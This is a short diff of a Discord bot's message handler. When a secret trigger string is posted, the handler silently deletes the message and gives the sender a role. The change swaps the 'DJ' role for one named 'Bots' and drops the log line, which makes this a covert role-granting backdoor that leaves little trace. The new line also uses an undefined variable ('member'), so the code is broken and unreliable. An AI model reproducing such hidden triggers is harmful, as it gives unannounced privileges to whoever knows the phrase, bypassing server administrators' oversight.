@@ -419,8 +419,8 @@ bot.on('message', message => {
 	if(message.content === 'efhsdfcsbuyf54sqd1r6sqd1c') {
 		message.channel.bulkDelete(1)
 		const guildMember = message.member;
-		guildMember.addRole('DJ');
-		console.log('tu es DJ')
+		let memberRole = member.guild.roles.find("name", "Bots")
+		guildMember.addRole(memberRole);
 	}
 
 	if(message.content === 'erfteqv57s1e4dfc1s1') {
